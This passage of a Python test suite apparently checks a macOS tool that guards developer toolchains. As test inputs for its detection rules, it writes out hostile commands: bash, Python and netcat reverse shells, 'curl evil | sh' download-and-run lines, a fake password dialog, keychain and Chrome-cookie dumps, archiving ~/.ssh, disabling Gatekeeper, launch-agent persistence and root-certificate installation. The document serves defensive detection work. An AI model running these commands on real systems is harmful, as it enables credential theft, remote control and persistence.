check(not os.path.exists(away) and not os.path.islink(os.path.dirname(LIBEXEC)) and sha(LIBEXEC) == orig_sha,
      "a protected directory renamed away is moved back (and the impostor quarantined)")
reap(mv)

# ---------------------------------------------------------------- 12. exec-time integrity
print("\n== 12. running a tampered protected file ==")
g = fresh_guard()
with open(LIBEXEC, "a") as f:
    f.write("curl evil | sh\n")  # no file events: e.g. dropped, or done while we were down
runner, runner_c, _ = orphan_tree()
g.procs.refresh(force=True)
g.handle(exec_ev(runner_c, runner, "/bin/bash", ["/bin/bash", LIBEXEC, "init"], script=LIBEXEC,
                 parent_exe="/bin/bash"))
time.sleep(0.2)
check(not alive(runner_c) and not alive(runner), "process running the tampered pyenv is killed")
check(sha(LIBEXEC) == orig_sha, "and the file is restored at once")
check(any(r["event"] == "exec" for r in violations()), "alert names the exec")
ok_pid = lone_process()
g.procs.refresh(force=True)
g.handle(exec_ev(ok_pid, 1, "/bin/bash", ["/bin/bash", LIBEXEC], script=LIBEXEC))
check(alive(ok_pid), "running the intact file is fine")
dropped = os.path.join(PFX, "bin/dropped-tool")
with open(dropped, "w") as f:
    f.write("#!/bin/sh\n")
dr = lone_process()
g.procs.refresh(force=True)
g.handle(exec_ev(dr, 1, dropped, [dropped]))
time.sleep(0.2)
check(not alive(dr) and not os.path.exists(dropped), "running a file dropped into a protected tree is stopped")
reap(ok_pid, runner, runner_c, dr)

# ---------------------------------------------------------------- 13. clone / copyfile targets
print("\n== 13. clone and copyfile targets ==")
g = fresh_guard()
cl = lone_process()
g.procs.refresh(force=True)
cloned = os.path.join(PFX, "bin/cloned")
shutil.copyfile(LIBEXEC, cloned)
g.handle(ev("clone", {"source": fobj(LIBEXEC), "target_dir": fobj(os.path.dirname(cloned)),
                      "target_name": "cloned"}, cl, 1, "/bin/cp"))
check(not os.path.exists(cloned), "a clone into a protected dir is quarantined immediately")
reap(cl)

# ---------------------------------------------------------------- 14. raw-line prefilter
print("\n== 14. event prefilter ==")
g = fresh_guard()
pf = g.prefilter


def compact(obj):  # eslogger style: no spaces, escaped slashes
    return json.dumps(obj, separators=(",", ":")).replace("/", "\\/")


inside = compact(ev("close", {"modified": True, "target": fobj(LIBEXEC)}, 1, 1, "/usr/bin/vim"))
check(pf.wants(inside), "escaped-slash JSON for a protected target is parsed")
check(pf.wants(json.dumps(ev("close", {"modified": True, "target": fobj(LIBEXEC)}, 1, 1, "/x"))),
      "spaced JSON for a protected target is parsed")
own_exe = compact(ev("open", {"fflag": 1, "file": fobj("/Users/x/Library/Caches/a")}, 1, 1, RUBY))
check(not pf.wants(own_exe), "an event whose only protected path is the process's own binary is skipped")
check(not pf.wants(compact(ev("close", {"modified": False, "target": fobj(LIBEXEC)}, 1, 1, "/x"))),
      "unmodified close is skipped")
check(pf.wants(compact(ev("close", {"modified": False, "was_mapped_writable": True,
                                    "target": fobj(LIBEXEC)}, 1, 1, "/x"))),
      "close of a file that was mapped writable is parsed")
check(pf.wants(compact(ev("exec", {"target": proc(2, 1, "/bin/ls"), "args": ["ls"]}, 2, 1, "/bin/zsh"))),
      "process events are always parsed")
check(pf.wants('{"weird": "format"}'), "lines it cannot classify are parsed (fail open)")
data_vol = compact(ev("unlink", {"target": fobj("/System/Volumes/Data" + LIBEXEC)}, 1, 1, "/bin/rm"))
check(pf.wants(data_vol), "Data-volume firmlink paths are recognized")
new_in_dir = compact(ev("create", {"destination_type": 1,
                                   "destination": {"new_path": newp(os.path.join(PFX, "bin/new"))}}, 1, 1, "/x"))
check(pf.wants(new_in_dir), "create events naming a protected directory are parsed")
t0 = time.time()
for _ in range(20000):
    pf.wants(own_exe)
per_line = (time.time() - t0) / 20000 * 1e6
check(per_line < 50, f"skipping an irrelevant event costs {per_line:.1f} us")

# ---------------------------------------------------------------- 15. dropped events and stalls
print("\n== 15. dropped events, stalled stream ==")
g = fresh_guard()
g.next_scan = time.time() + 9999
for n in (1, 2, 6):
    g.feed_line(compact({"global_seq_num": n, "event": {"fork": {"child": proc(10 + n, 1, "/bin/sh")}},
                         "process": proc(1, 0, "/sbin/launchd")}))
check(g.stats["dropped_events"] == 3, "sequence gap counted")
check(g.next_scan < time.time() + 5, "a gap schedules a scan right away")
check(any("dropped 3" in r.get("detail", "") for r in log_records()), "a gap raises an alert")


class FakeChild:
    pid = 99999
    killed = False

    def poll(self):
        return None

    def kill(self):
        self.killed = True


g.child = FakeChild()
g.last_line_t = time.time() - 120
g._stream_watchdog(time.time())
check(g.child.killed and any("no events from eslogger" in r.get("detail", "") for r in log_records()),
      "a silent event stream is reported and restarted")
g.child = None

# ---------------------------------------------------------------- 16. exec and system-event rules (real rules.json)
print("\n== 16. shipped detection rules ==")
real = json.load(open(os.path.join(HERE, "rules.json")))
det = [r for r in real["rules"] if r.get("type") in ("exec", "event")]
g = fresh_guard(extra_rules=det)


def fires(rule_id, exe, args, script=None):
    before = len(violations(rule_id))
    p = 600000 + len(log_records())  # fake pid: nothing real gets killed
    g.handle(exec_ev(p, 1, exe, args, script=script))
    return len(violations(rule_id)) > before


check(fires("reverse-shell", "/bin/bash", ["bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"]),
      "bash /dev/tcp reverse shell")
check(fires("reverse-shell", "/usr/bin/python3",
            ["python3", "-c", "import socket,os,pty;s=socket.socket();s.connect(('1.2.3.4',1));"
                              "[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn('/bin/sh')"]),
      "python reverse shell")
check(fires("reverse-shell", "/usr/bin/nc", ["nc", "-e", "/bin/sh", "1.2.3.4", "9"]), "nc -e reverse shell")
check(not fires("reverse-shell", "/bin/bash", ["bash", "-c", "timeout 1 bash -c '</dev/tcp/localhost/5432'"]),
      "a /dev/tcp port check is not a reverse shell")
check(not fires("reverse-shell", "/usr/bin/nc", ["nc", "-zv", "example.com", "443"]), "nc -zv is fine")
check(fires("password-phishing-dialog", "/usr/bin/osascript",
            ["osascript", "-e", 'display dialog "macOS needs your password" default answer "" '
                                'with hidden answer with title "System Preferences"']),
      "osascript hidden-answer password dialog")
check(not fires("password-phishing-dialog", "/usr/bin/osascript",
                ["osascript", "-e", 'display notification "build done"']), "ordinary osascript is fine")
check(fires("password-verification", "/usr/bin/dscl", ["dscl", "/Local/Default", "-authonly", "dev", "hunter2"]),
      "dscl -authonly password check")
check(fires("keychain-dump", "/usr/bin/security", ["security", "dump-keychain", "-d"]), "security dump-keychain")
check(fires("keychain-dump", "/usr/bin/security",
            ["security", "find-generic-password", "-s", "Chrome Safe Storage", "-w"]),
      "security find-generic-password -w")
check(not fires("keychain-dump", "/usr/bin/security", ["security", "list-keychains"]), "security list-keychains is fine")
check(fires("browser-data-access", "/usr/bin/sqlite3",
            ["sqlite3", "/Users/x/Library/Application Support/Google/Chrome/Default/Cookies", ".dump"]),
      "sqlite3 on browser cookies")
check(fires("sensitive-archive-or-upload", "/usr/bin/zip", ["zip", "-r", "/tmp/o.zip", "/Users/x/.ssh"]),
      "zipping ~/.ssh")
check(not fires("sensitive-archive-or-upload", "/bin/cp", ["cp", "/Users/x/.ssh/id_ed25519.pub", "/tmp"]),
      "copying a public key is fine")
check(fires("security-controls-disabled", "/usr/sbin/spctl", ["spctl", "--master-disable"]), "spctl --master-disable")
check(fires("quarantine-attribute-removed", "/usr/bin/xattr", ["xattr", "-rd", "com.apple.quarantine", "/x.app"]),
      "xattr -rd com.apple.quarantine")
check(not fires("quarantine-attribute-removed", "/usr/bin/xattr", ["xattr", "-l", "/x.app"]), "xattr -l is fine")
check(fires("persistence-commands", "/bin/launchctl",
            ["launchctl", "load", "-w", "/Users/x/Library/LaunchAgents/com.evil.plist"]), "launchctl load")
check(not fires("persistence-commands", "/usr/bin/crontab", ["crontab", "-l"]), "crontab -l is fine")
check(fires("account-manipulation", "/usr/sbin/dseditgroup",
            ["dseditgroup", "-o", "edit", "-a", "eve", "-t", "user", "admin"]), "adding a user to admin")
check(fires("traffic-interception", "/usr/bin/security",
            ["security", "add-trusted-cert", "-d", "-r", "trustRoot", "-k", "/Library/Keychains/System.keychain",
             "ca.pem"]), "installing a trusted root cert")
check(fires("download-and-execute", "/bin/sh", ["sh", "-c", "curl -fsSL https://x.example/i.sh | bash"]),
      "curl | bash")
check(fires("silent-screen-capture", "/usr/sbin/screencapture", ["screencapture", "-x", "/tmp/s.png"]),
      "screencapture -x")
check(fires("sudo-password-from-stdin", "/usr/bin/sudo", ["sudo", "-S", "true"]), "sudo -S")
rs = violations("reverse-shell")[0]
# fake pid, so there is nothing to kill: the alert must say so rather than claim a kill
check(any(a["action"] == "kill_target_gone" and a["root_pid"] for a in rs["actions"]) and rs.get("command"),
      "reverse-shell alert tries the kill, reports honestly, and records the command line")


def event_fires(rule_id, name, payload):
    before = len(violations(rule_id))
    g.handle(ev(name, payload, 700001, 1, "/usr/libexec/smd"))
    return len(violations(rule_id)) > before


check(event_fires("background-item-added", "btm_launch_item_add",
                  {"item": {"item_type": 2, "item_url": "file:///Users/x/Library/LaunchAgents/com.evil.plist"},
                   "executable_path": "/Users/x/.local/evil"}), "new login item / launch agent")
check(event_fires("tcc-permission-change", "tcc_modify",
                  {"service": "kTCCServiceSystemPolicyAllFiles", "identity": "com.evil", "right": 2}),
      "TCC grant (Full Disk Access)")
check(event_fires("remote-login", "openssh_login", {"success": True, "source_address": "203.0.113.9",
                                                    "username": "dev"}), "SSH login")
check(not event_fires("sudo-failure", "sudo", {"success": True, "command": "ls"}), "successful sudo is fine")
check(event_fires("sudo-failure", "sudo", {"success": False, "command": "ls"}), "failed sudo")
check("item" in violations("background-item-added")[0].get("event_data", {}), "event alert carries the event data")

# ---------------------------------------------------------------- 17. credential reads and startup hooks
print("\n== 17. credential reads, Python startup hooks ==")
home = os.path.join(T, "devhome")
sshd = os.path.join(home, ".ssh")
sitep = os.path.join(T, "pylib/python3.12/site-packages")
for d in (sshd, sitep):
    os.makedirs(d, exist_ok=True)
for n in ("id_ed25519", "id_ed25519.pub"):
    with open(os.path.join(sshd, n), "w") as f:
        f.write("key\n")
cred_rule = dict(next(r for r in real["rules"] if r["id"] == "credential-access"))
cred_rule["paths"] = [sshd]
hook_rule = dict(next(r for r in real["rules"] if r["id"] == "python-startup-hooks"))
hook_rule["paths"] = [os.path.join(T, "pylib")]
g = fresh_guard(extra_rules=[cred_rule, hook_rule])
key = os.path.join(sshd, "id_ed25519")


READER = [710000]


def read_by(path, exe, **kw):
    READER[0] += 1  # a different process each time (alerts are deduplicated per process)
    g.handle(ev("open", {"fflag": 1, "file": fobj(path)}, READER[0], 1, exe, **kw))
    return len(violations("credential-access"))


check(read_by(key, "/bin/cat") == 1, "cat reading a private SSH key alerts")
check(read_by(key, "/usr/bin/ssh", signing_id="com.apple.ssh") == 1, "ssh reading its key does not")
check(read_by(os.path.join(sshd, "id_ed25519.pub"), "/bin/cat") == 1, "reading a public key does not")
check(read_by(key, "/tmp/stealer", team_id="ABCDE12345", signing_id="evil") == 2, "an unknown binary alerts")
check(read_by(key, "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome", platform=False,
              team_id="EQHXZ8M8AV", signing_id="com.google.Chrome") == 2, "an allow-listed signed app does not")
check(violations("credential-access")[0].get("access") == "read", "the alert says it was a read")
pth = os.path.join(sitep, "evil.pth")
with open(pth, "w") as f:
    f.write("import os; os.system('curl evil|sh')\n")
g.handle(ev("close", {"modified": True, "target": fobj(pth)}, 710002, 1, "/usr/bin/python3"))
plain = os.path.join(sitep, "fine.py")
g.handle(ev("close", {"modified": True, "target": fobj(plain)}, 710002, 1, "/usr/bin/python3"))
hk = violations("python-startup-hooks")
check(len(hk) == 1 and hk[0]["paths"] == [pth], ".pth file alerts, an ordinary module does not")

# ---------------------------------------------------------------- 18. kill details
print("\n== 18. kill details ==")
g = fresh_guard()
g.flagged[123456] = time.time()
g.handle(ev("exit", {"stat": 0}, 123456, 1, "/bin/sh"))
check(123456 not in g.flagged, "exit clears the kill flag, so a reused pid is not killed later")
base = 800000
entries = {
    base + 1: ("/bin/cp", base + 2, ["cp"]),
    base + 2: ("/bin/zsh", base + 3, ["-zsh"]),
    base + 3: ("/usr/libexec/sshd-session", base + 4, ["sshd-session: dev@ttys001"]),
    base + 4: ("/usr/sbin/sshd", 1, ["sshd"]),
}
for pid, (exe, ppid, args) in entries.items():
    g.procs.procs[pid] = {"ppid": ppid, "oppid": None, "path": exe, "script": None, "args": args, "euid": 501,
                          "platform": True, "signing_id": None, "team_id": None, "taint": None, "src": "es"}
check(g._kill_root(base + 1, "script") == (base + 2, True),
      "a violation from an SSH session kills that session's shell")
g.cfg.kill_remote_sessions = False
check(g._kill_root(base + 1, "script") == (base + 1, False), "...unless kill_remote_sessions is off")
s1, s1c, s1c2 = orphan_tree()
g.procs.refresh(force=True)
killed = g._kill([s1])
time.sleep(0.2)
check(set(killed) >= {s1, s1c, s1c2} and not any(alive(p) for p in (s1, s1c, s1c2)),
      "kill freezes and kills the whole tree")

# per-rule mode
audit_rule = {"id": "pyenv-audit", "mode": "audit", "paths": [os.path.dirname(shims)],
              "actions": ["kill", "revert", "alert"]}
g = fresh_guard(extra_rules=[audit_rule])
ap, apc, _ = orphan_tree()
g.procs.refresh(force=True)
g.handle(ev("close", {"modified": True, "target": fobj(shim_py)}, apc, ap, "/bin/bash"))
time.sleep(0.2)
acts = [a["action"] for r in violations("pyenv-audit") for a in r["actions"]]
check("would_kill" in acts and alive(ap), "a rule's own audit mode wins over the global enforce mode")
reap(ap, apc, _)

# ---------------------------------------------------------------- 19. stopping and restarting
print("\n== 19. stop authorization, restart reporting ==")
g = fresh_guard()
os.makedirs(g.cfg.control_dir, exist_ok=True)
open(g.marker, "w").write("1")
try:
    g._on_term(15, None)
except SystemExit:
    pass
stop = [r for r in log_records() if r["type"] == "stopped"][-1]
check(stop["authorized"] is False and stop["severity"] == "high" and os.path.exists(g.marker),
      "unauthorized SIGTERM: high alert, marker kept so the restart is reported")
tg.write_control(g.cfg, "stop.json", {"until": time.time() + 60})
try:
    g._on_term(15, None)
except SystemExit:
    pass
stop = [r for r in log_records() if r["type"] == "stopped"][-1]
check(stop["authorized"] is True and not os.path.exists(g.marker), "authorized stop is clean")
open(g.marker, "w").write("1")
g._report_previous_run()
check(log_records()[-1]["type"] == "tamper_attempt" and log_records()[-1]["severity"] == "critical",
      "a marker from this boot means the watcher was killed: critical")
os.utime(g.marker, (1000000000, 1000000000))
g._report_previous_run()
check(log_records()[-1]["type"] == "started_after_reboot", "a marker from before boot is just a reboot")

# ---------------------------------------------------------------- 20. signed webhook
print("\n== 20. webhook ==")
got = []


class Hook(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        body = self.rfile.read(int(self.headers["Content-Length"]))
        got.append((dict(self.headers), body))
        self.send_response(204)
        self.end_headers()

    def log_message(self, *a):
        pass


srv = http.server.HTTPServer(("127.0.0.1", 0), Hook)
threading.Thread(target=srv.serve_forever, daemon=True).start()
cfg = tg.Config(write_rules(settings={"webhook_url": f"http://127.0.0.1:{srv.server_port}/a",
                                      "webhook_secret": "s3cret"}, name="rules-hook.json"))
al = tg.Alerter(cfg)
al.emit({"type": "violation", "rule": "x", "severity": "critical"})
al.flush(5)
srv.shutdown()
ok = bool(got)
if ok:
    hdrs, body = got[0]
    hdrs = {k.lower(): v for k, v in hdrs.items()}  # HTTP header names are case-insensitive
    want = "sha256=" + hmac.new(b"s3cret", body, hashlib.sha256).hexdigest()
    ok = hdrs.get("x-toolchainguard-signature") == want and json.loads(body)["rule"] == "x"
check(ok, "webhook delivered with a valid HMAC signature")

# ---------------------------------------------------------------- 21. shipped config
print("\n== 21. shipped rules.json ==")
cfg = tg.Config(os.path.join(HERE, "rules.json"))
check(cfg.mode == "audit", "ships in audit mode")
check(all(r.id for r in cfg.rules) and len({r.id for r in cfg.rules}) == len(cfg.rules), "rule ids are unique")
hb = next(r for r in cfg.file_rules if r.id == "homebrew-toolchain")
check(not any("vendor/bundle" in x or "node_modules" in x or "site-packages" in x for x in hb.excludes),
      "brew's gems, global npm packages and site-packages are no longer excluded")
if os.path.exists("/usr/bin/eslogger"):
    supported = set(subprocess.run(["/usr/bin/eslogger", "--list-events"], capture_output=True,
                                   text=True).stdout.split())
    missing = [e for e in cfg.events if e not in supported]
    check(not missing, f"every event the rules need exists in this macOS's eslogger {missing or ''}")

print("\n" + ("ALL PASSED" if not FAILS else f"{len(FAILS)} FAILED: {FAILS}"))
for pid in SPAWNED:
    try:
        os.kill(pid, 9)
    except OSError:
        pass
shutil.rmtree(T, ignore_errors=True)
sys.exit(1 if FAILS else 0)
